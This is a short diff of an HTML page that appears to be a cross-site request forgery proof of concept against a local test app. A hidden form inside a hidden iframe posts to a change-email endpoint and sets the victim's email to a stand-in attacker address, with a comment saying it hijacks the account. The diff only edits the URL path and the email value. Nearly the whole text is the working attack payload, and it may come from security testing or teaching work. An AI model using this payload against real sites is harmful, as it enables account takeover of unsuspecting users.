@@ -26,9 +26,9 @@
     -->
     <iframe name="hidden_iframe" style="display:none;"></iframe>
     
-    <form action="http://127.0.0.1:5000/change_email" method="POST" target="hidden_iframe" style="display: none;">
+    <form action="http://localhost:5000/change-email" method="POST" target="hidden_iframe" style="display: none;">
         <!-- Attacker provides their own email to hijack the victim's account -->
-        <input type="hidden" name="new_email" value="hacker@evil-domain.com">
+        <input type="hidden" name="new_email" value="attacker@evil.com">
     </form>
 </body>
 </html>
